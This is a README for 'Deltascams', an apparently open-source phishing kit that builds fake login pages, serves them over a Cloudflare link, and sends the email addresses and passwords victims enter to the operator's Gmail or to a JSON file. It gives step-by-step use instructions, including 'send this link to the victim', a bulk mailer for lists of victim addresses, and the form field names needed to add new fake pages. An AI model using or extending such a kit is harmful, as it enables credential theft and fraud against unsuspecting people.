# Delta_scams
Welcome to Deltascams, a tool belonging to the Delta Project.

It was developed by Mohammed Al-Khadri or "dreed32w"

# Description of the tool
The tool creates a custom dummy page of your choice and generates a Cloudflare link that you can send to anyone in the world.


It also sends the entered information to the email address you registered with it, as well as the information in the user_data.json file.

Furthermore, the tool provides a way to send the page to multiple email addresses simultaneously, all for free.

# How to use
First, open the Deltascams.exe file.

Second, click Login, then enter your email address and the app password you'll receive through two-step verification on your Gmail account.

<img width="1302" height="635" alt="1" src="https://github.com/user-attachments/assets/6e0eb5ce-0928-4250-9ab8-0884b0ac3ee6" />


Third, choose any fake page and click Start. A Cloudflare link will be generated for you. Send this link to the victim and wait for the information in your Gmail or in the user_data.json file.

<img width="1298" height="632" alt="2" src="https://github.com/user-attachments/assets/a46d9cca-3cb0-4c18-9361-5a9fbb390a36" />



Fourth, the multi-email sender (optional): Click the sender button at the top. This will take you to another screen where you'll fill in the message information and upload the victim emails. Then click send (this will take some time).

<img width="1300" height="632" alt="3" src="https://github.com/user-attachments/assets/23114658-0609-4535-8e9b-512be7024366" />



# Tool features
The tool is open-source, meaning it's customizable. If you're a programmer, you can add more fake pages to the pages folder. However, if you add another fake page, make sure that `<form action="../../send.php" mehod="post">` is correct. Also, ensure that the email field contains `name="email"` and the password field contains `name="password"`.

Additionally, there's a tool file called 'Deltascams.py' that you can modify.
